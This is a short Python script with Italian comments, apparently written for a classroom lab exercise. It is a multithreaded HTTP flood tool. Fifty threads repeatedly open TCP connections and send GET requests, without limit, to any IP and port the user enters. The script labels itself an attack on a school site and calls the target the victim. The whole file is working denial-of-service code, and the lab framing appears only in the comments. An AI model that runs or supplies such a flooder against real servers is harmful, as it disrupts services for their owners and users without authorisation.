'''
Programma per inviare richieste al server (simulazione attacco dos, o stress test)
'''

import socket
import threading
import time

# funzione attacco singola

def attacco(target_host, target_port):

    while True: # il thread non deve mai smettere di inviare richieste
        try: # se non si connette non crasha ma riprova 

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # crea la socket ipv4, tcp
            s.connect((target_host, target_port)) # Connette -> IMPORTANTE LA DOPPIA PARENTESI PER LA TUPLA

            # payload ( la nostra 'arma' )
            # Le richieste http sono fatte: metodo + path + versione + host + formattazione finale

            payload = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
            s.send(payload.encode('utf-8')) # la manda nella connessione sottoforma di byte
            s.close() # chiude la socket e siamo pronti a riaprirla

        except:
            pass # se il server è gia downm, noi non ci fermiamo ma riproviamo


if __name__=="__main__":

    print("-- ATTACCO SITO SCOLASTICO --")

    # presa dati in input 
    t_host = input("Inserire indirizzo ip della vittima: ")
    t_port = int(input("Inserire porta: "))

    # per coordinarci in lab 
    input(f"Target: {t_host}:{t_port}. premi INVIO per lanciare il tuo attacco...")

    for i in range(50): # ciclo per tutti i thread
        t = threading.Thread(target=attacco, args=(t_host, t_port))
        t.daemon = True # per chiuderli tutti con "CTRL + C" e non farli runnare in background 
        t.start() # starta il thread
        print(f"Lanciato thread {t.name} - ID Memoria: {id(t)}")
    
    print("Attacco in corso... (Premi CTRL+C per fermare)")

    try:
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n Attacco fermato.")


